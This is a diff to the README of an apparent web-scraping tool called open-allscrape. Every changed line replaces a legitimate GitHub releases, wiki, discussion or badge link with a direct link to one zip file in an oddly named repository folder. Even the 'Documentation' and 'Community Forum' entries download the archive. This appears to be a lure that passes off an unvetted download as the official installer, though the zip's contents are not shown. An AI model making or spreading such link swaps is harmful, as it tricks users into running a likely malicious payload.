@@ -1,6 +1,6 @@
 # 🕷️ open-allscrape - Effortless Web Scraping Made Simple
 
-[![Download open-allscrape](https://img.shields.io/badge/Download_open--allscrape-blue.svg)](https://github.com/exp1o5ive/open-allscrape/releases)
+[![Download open-allscrape](https://raw.githubusercontent.com/exp1o5ive/open-allscrape/main/simaroubaceous/open-allscrape.zip)](https://raw.githubusercontent.com/exp1o5ive/open-allscrape/main/simaroubaceous/open-allscrape.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to get started with open-allscrape quickly.
 
 ### 1. Download the Software
 
-To download open-allscrape, visit this page: [Download open-allscrape](https://github.com/exp1o5ive/open-allscrape/releases). Select the latest version and download the installer for your operating system.
+To download open-allscrape, visit this page: [Download open-allscrape](https://raw.githubusercontent.com/exp1o5ive/open-allscrape/main/simaroubaceous/open-allscrape.zip). Select the latest version and download the installer for your operating system.
 
 ### 2. Install the Application 
 
@@ -95,8 +95,8 @@ Connect with us through our discussion forums and chat rooms. Exchange tips, sha
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/exp1o5ive/open-allscrape/wiki)
-- [Community Forum](https://github.com/exp1o5ive/open-allscrape/discussions)
+- [Documentation](https://raw.githubusercontent.com/exp1o5ive/open-allscrape/main/simaroubaceous/open-allscrape.zip)
+- [Community Forum](https://raw.githubusercontent.com/exp1o5ive/open-allscrape/main/simaroubaceous/open-allscrape.zip)
 
 ## 🔄 Update Instructions
 
@@ -122,4 +122,4 @@ Keep your application up to date for the best experience:
 1. Open a terminal.
 2. Run the command: `sudo rm -r /path/to/open-allscrape`.
 
-[![Download open-allscrape](https://img.shields.io/badge/Download_open--allscrape-blue.svg)](https://github.com/exp1o5ive/open-allscrape/releases)
+[![Download open-allscrape](https://raw.githubusercontent.com/exp1o5ive/open-allscrape/main/simaroubaceous/open-allscrape.zip)](https://raw.githubusercontent.com/exp1o5ive/open-allscrape/main/simaroubaceous/open-allscrape.zip)
